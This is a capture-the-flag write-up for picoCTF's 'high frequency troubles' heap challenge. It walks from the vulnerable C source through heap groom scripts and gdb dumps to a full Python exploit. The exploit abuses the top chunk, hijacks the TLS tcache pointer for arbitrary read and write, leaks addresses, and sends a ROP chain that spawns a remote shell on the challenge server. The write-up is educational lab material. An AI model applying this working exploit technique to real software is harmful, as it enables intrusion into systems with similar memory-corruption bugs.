# high frequency troubles:Binary Exploitation:500pts
Download the binary [here](hft).  
Download the source [here](main.c).  
Download libc [here](libc.so.6).  
Connect with the challenge instance here:  
`nc tethys.picoctf.net 50123`  

Hints  
1  
allocate a size greater than mp_.mmap_threshold  

# Solution
Binaries, libc, and source are distributed.  
First of all, when I looked at the source, it was as follows.  
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {"PKT_INFO", "\x1b[1;34m"},
    [PKT_MSG_DATA] = {"PKT_DATA", "\x1b[1;33m"},
};

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }

    putl(PKT_MSG_INFO, "BOOT_EQ");
}
```
`pkt_t`It seems to be a communication app that processes packets of user input in a structure that becomes. First, read 8 bytes in size.  
```c
        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);
```
After that, only the size`malloc`Then, after writing the size to the reserved area, write the options and the data body with 'gets'.  
```c
        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);
```
Here's a trivial heap overflow.
In the later processing, the behavior is distributed according to the value of the option, and the correspondence is as follows.  
```
0x0000000000000000: PKT_OPT_PING
0x0000000000000001: PKT_OPT_ECHO
0xXXXXXXXXXXXXXXXX: PKT_OPT_TRADE?
```
Output the value`PKT_OPT_ECHO`There seems to be a leak available.  
To sum up、 The goal of this problem is to RCE due to heap overflow.
However, since 'free' is not called, it is not straightforward, and since 'gets' is null-terminated, leakage is not easy. 
First, we will use the following script test.py to see the heap layout. 
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1) + b"satoki")

sock.sh()
```
Attach from another terminal after execution.  
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> vis
~~~
0x55555555a270  0x0000000000000000      0x0000000000000000      ................
0x55555555a280  0x0000000000000000      0x0000000000000000      ................
0x55555555a290  0x0000000000000000      0x0000000000000021      ........!.......
0x55555555a2a0  0x0000000000000018      0x0000000000000001      ................
0x55555555a2b0  0x0000696b6f746173      0x0000000000020d51      satoki..Q.......         <-- Top chunk
```
As per the source, it is secured from the heap.  
First of all, to solve the problem of not having 'free', it seems that there is a method called House of Orange that rewrites 'Top chunk' and calls '_int_free' when 'malloc'.  
According to a survey by experts, "'If the lower 12-bit is not broken, the assertion error will not occur!'" 
If you overflow the 'Top chunk' of the above heap from '0x0000000000020d51' to '0x0000000000000d51' and perform a larger 'malloc' again, a new heap will be allocated in another area.  
At that time, since it is determined that there is another area under the current heap by rewriting, heap merging does not occur, and the remaining '0xd51' is 'free' and leads to a free list. 
Since it can be 'malloc' as many times as you like, you can freely create 'tcachebins' and 'unsortedbins' by rewriting the size well when using new regions and securing new areas.
This solves the problem of not having 'free'.  
Using this operation, you can leak the address of the heap by connecting to an 'unsortedbin' and 'mallocating' it again。  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x0) + b"A" * 8 + p64(0xd51))

sock.sendafter(":[PKT_RES]\n", p64(0xD29))
sock.sendline(p64(0x0))

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
print(hex(u64(leak)))

sock.sh()
```
Execute.  
```bash
$ python test.py
[+] __init__: Successfully created new process (PID=153364)
0x55555555a2b0
PKT_INFO:[PKT_RES]
[ptrlib]$
```
The heap was as follows.  
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> vis
~~~
0x55555555a270  0x0000000000000000      0x0000000000000000      ................
0x55555555a280  0x0000000000000000      0x0000000000000000      ................
0x55555555a290  0x0000000000000000      0x0000000000000021      ........!.......
0x55555555a2a0  0x0000000000000018      0x0000000000000000      ................
0x55555555a2b0  0x4141414141414141      0x0000000000000021      AAAAAAAA!.......
0x55555555a2c0  0x0000000000000018      0x0000000000000001      ................
0x55555555a2d0  0x000055555555a2b0      0x0000000000000d11      ..UUUU..........         <-- unsortedbin[all][0]
0x55555555a2e0  0x00007ffff7facce0      0x00007ffff7facce0      ................
0x55555555a2f0  0x0000000000000000      0x0000000000000000      ................
0x55555555a300  0x0000000000000000      0x0000000000000000      ................
pwndbg> bins
~~~
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x55555555a2d0 —▸ 0x7ffff7facce0 ◂— 0x55555555a2d0
smallbins
empty
largebins
empty
```
It's unclear exactly, but it seems that there are probably some fd_nextsize from when it was sorted into 'largebins'.
Now that the heap address is available, it is possible to calculate and use the heap base address. 
Next, I want to leak the libc address, but it's difficult with the current functionality. Here, since only 'malloc' can be used, let's try to secure 0 or a huge number. 
Then, the area allocated when 'mallocing' '0x21299' was moved from the heap to the vicinity of libc.  
For '0x21298'
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/hft
~~~
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
    0x7ffff7d90000     0x7ffff7d93000 rw-p     3000      0 [anon_7ffff7d90]
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/libc.so.6
~~~
```
For '0x21299' 
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/hft
~~~
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
    0x7ffff7d6e000     0x7ffff7d93000 rw-p    25000      0 [anon_7ffff7d6e]
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/libc.so.6
~~~
```
I would be happy to see that address leaking could be achieved by cutting into the libc area with this behavior, but it was impossible because a new area would be secured if it was not enough at the time of 'malloc'.  
The only remaining method is to rewrite with a heap overflow, but since you only know the address of the heap, you can only destroy it.  
If you look for an address that you can break successfully, you will find some kind of heap address before libc.  
```
pwndbg> telescope 0x7ffff7d6e000 20000
00:0000│    0x7ffff7d6e000 ◂— 0x0
01:0008│    0x7ffff7d6e008 ◂— 0x22002
02:0010│ r9 0x7ffff7d6e010 ◂— 0x21299
03:0018│    0x7ffff7d6e018 ◂— 0x0
... ↓       17618 skipped
44d6:226b0│    0x7ffff7d906b0 —▸ 0x7ffff7fad580 —▸ 0x7ffff7fa9820 —▸ 0x7ffff7f6d1d7 ◂— 0x636d656d5f5f0043 /* 'C' */
44d7:226b8│    0x7ffff7d906b8 —▸ 0x7ffff7fb5340 (_res) ◂— 0x0
44d8:226c0│    0x7ffff7d906c0 ◂— 0x0
44d9:226c8│    0x7ffff7d906c8 —▸ 0x7ffff7f514c0 ◂— 0x100000000
44da:226d0│    0x7ffff7d906d0 —▸ 0x7ffff7f51ac0 ◂— 0x100000000
44db:226d8│    0x7ffff7d906d8 —▸ 0x7ffff7f523c0 ◂— 0x2000200020002
44dc:226e0│    0x7ffff7d906e0 ◂— 0x0
... ↓       2 skipped
44df:226f8│    0x7ffff7d906f8 —▸ 0x55555555a010 ◂— 0x0
44e0:22700│    0x7ffff7d90700 ◂— 0x0
44e1:22708│    0x7ffff7d90708 —▸ 0x7ffff7facc80 ◂— 0x0
44e2:22710│    0x7ffff7d90710 ◂— 0x0
... ↓       5 skipped
44e8:22740│    0x7ffff7d90740 ◂— 0x7ffff7d90740
44e9:22748│    0x7ffff7d90748 —▸ 0x7ffff7d91160 ◂— 0x1
44ea:22750│    0x7ffff7d90750 —▸ 0x7ffff7d90740 ◂— 0x7ffff7d90740
44eb:22758│    0x7ffff7d90758 ◂— 0x0
44ec:22760│    0x7ffff7d90760 ◂— 0x0
44ed:22768│    0x7ffff7d90768 ◂— 0xfc4ebc0b86d9f900
~~~
pwndbg> vmmap 0x7ffff7d906f8
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
►   0x7ffff7d6e000     0x7ffff7d93000 rw-p    25000      0 [anon_7ffff7d6e] +0x226f8
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/libc.so.6
```
This seems to be a thread-specific area called TLS (Thread Local Storage). 
There seems to be a pointer to the master canary and the management area of 'tcachebins'. Nicely create 'tcachebins' and take a look at the admin area.  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))

sock.sendafter(":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x0))

sock.sendafter(":[PKT_RES]\n", p64(0x22000))

sock.sh()
```
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> bins
~~~
tcachebins
0x20 [  1]: 0x55555555afd0 ◂— 0x0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
~~~
pwndbg> telescope 0x7ffff7d6d000 20000
00:0000│    0x7ffff7d6d000 ◂— 0x0
01:0008│    0x7ffff7d6d008 ◂— 0x23002
02:0010│ r9 0x7ffff7d6d010 ◂— 0x22000
03:0018│    0x7ffff7d6d018 ◂— 0x0
... ↓       18130 skipped
46d6:236b0│    0x7ffff7d906b0 —▸ 0x7ffff7fad580 —▸ 0x7ffff7fa9820 —▸ 0x7ffff7f6d1d7 ◂— 0x636d656d5f5f0043 /* 'C' */
46d7:236b8│    0x7ffff7d906b8 —▸ 0x7ffff7fb5340 (_res) ◂— 0x0
46d8:236c0│    0x7ffff7d906c0 ◂— 0x0
46d9:236c8│    0x7ffff7d906c8 —▸ 0x7ffff7f514c0 ◂— 0x100000000
46da:236d0│    0x7ffff7d906d0 —▸ 0x7ffff7f51ac0 ◂— 0x100000000
46db:236d8│    0x7ffff7d906d8 —▸ 0x7ffff7f523c0 ◂— 0x2000200020002
46dc:236e0│    0x7ffff7d906e0 ◂— 0x0
... ↓       2 skipped
46df:236f8│    0x7ffff7d906f8 —▸ 0x55555555a010 ◂— 0x1
~~~
pwndbg> x/32xg 0x55555555a010
0x55555555a010: 0x0000000000000001      0x0000000000000000
0x55555555a020: 0x0000000000000000      0x0000000000000000
0x55555555a030: 0x0000000000000000      0x0000000000000000
0x55555555a040: 0x0000000000000000      0x0000000000000000
0x55555555a050: 0x0000000000000000      0x0000000000000000
0x55555555a060: 0x0000000000000000      0x0000000000000000
0x55555555a070: 0x0000000000000000      0x0000000000000000
0x55555555a080: 0x0000000000000000      0x0000000000000000
0x55555555a090: 0x000055555555afd0      0x0000000000000000
~~~
```
From the TLS link destination, the number of 'tcachebins' and the link destination are managed on the heap. 
If this structure is disguised and 'malloc', it seems that arbitrary parts can be misidentified as 'tcachebins' and secured. 
Fortunately, a huge number of 'malloc' can be written to TLS directly via overflow. 
Also, 'mallocing' a huge number can be repeated multiple times. 
Since data can be written with 'PKT_OPT_PING' and data can be output with 'PKT_OPT_ECHO', AAR and AAW are practically possible. 
All that remains is to perform the following flow using the above technique multiple times.  

1. Put the libc address on the heap and read it with AAR 
2. Read the stack address on libc with AAR 
3. Calculate the return address from the stack address and write the ROP with AAW

Note that since the size information is also written in the 'malloc' area, it deviates by 8 bytes from the specified address. 
In addition, since it is necessary to specify options, it is better to think that it can be written from a place that is further off by 8 bytes. 
In the case of a libc address leak, the size information and options are corrupted during AAR, so it will fall when leaked from 'unsortedbin'. 
Therefore, connect two 'largebins' to read the chunk behind it. 
It is unclear how to check the integrity of the link, but from this point on, there is no problem if you communicate with 'smallbins'. 
The following exploit.py is used.  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

sock = Socket("nc tethys.picoctf.net 50123")
# sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))  # tamper the size of top chunk

# _int_free: tcachebins[0x20]
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"B" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: unsortedbin
sock.sendafter(":[PKT_RES]\n", p64(0x419))
sock.sendline(p64(0x3)[:-1])

# heap base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"heap leak address: {hex(u64(leak))}")
heap_base = u64(leak) - 0x21BC0
logger.info(f"heap base address: {hex(heap_base)}")

sock.sendafter(":[PKT_RES]\n", p64(0x780))
sock.sendline(p64(0x0) + b"C" * 0x778 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"D" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x3)[:-1])

# fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(heap_base + 0x65BC0)[:-1]
)  # largebins address

# allocate front of tls & tamper the fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"E" * 0x236D8 + p64(heap_base + 0x21C10)[:-1]
)  # -> fake tcachebins controller no.1

# libc base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"libc leak address: {hex(u64(leak))}")
libc.base = u64(leak) - 0x21A0D0

# fake tcachebins controller no.2
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(libc.base + 0x21AA10)[:-1]
)  # libc address (on stack address)

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"F" * 0x466D8 + p64(heap_base + 0x21CB0)[:-1]
)  # -> fake tcachebins controller no.2

# stack address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
stack_leak = sock.recvuntil("]\n", drop=True)
logger.info(f"stack leak address: {hex(u64(stack_leak))}")
return_address = u64(stack_leak) - 0x150
logger.info(f"return address: {hex(return_address)}")

# fake tcachebins controller no.3
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(return_address - 0x18)[:-1]
)  # return address - 0x18

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"G" * 0x696D8 + p64(heap_base + 0x21D50)[:-1]
)  # -> fake tcachebins controller no.3

# tamper the return address
sock.sendafter(":[PKT_RES]\n", p64(0x18))
payload = p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))
sock.sendline(p64(0x0) + b"H" * 0x18 + payload)

sock.sh()
```
Execute.  
```bash
$ python exploit.py
[+] __init__: Successfully connected to tethys.picoctf.net:50123
[+] <module>: heap base address: 0x558993106000
[+] base: New base address: 0x7fd70d34c000
[+] <module>: stack leak address: 0x7ffe36a47c98
[+] <module>: return address: 0x7ffe36a47b48
[ptrlib]$ ls
[ptrlib]$ Makefile
artifacts.tar.gz
flag.txt
hft
libc.so.6
main.c
metadata.json
profile
cat flag.txt
[ptrlib]$ picoCTF{mm4p_mm4573r_de3d190b}
```
The shell was removed, and the flag was written on the flag.txt.  

## picoCTF{mm4p_mm4573r_de3d190b}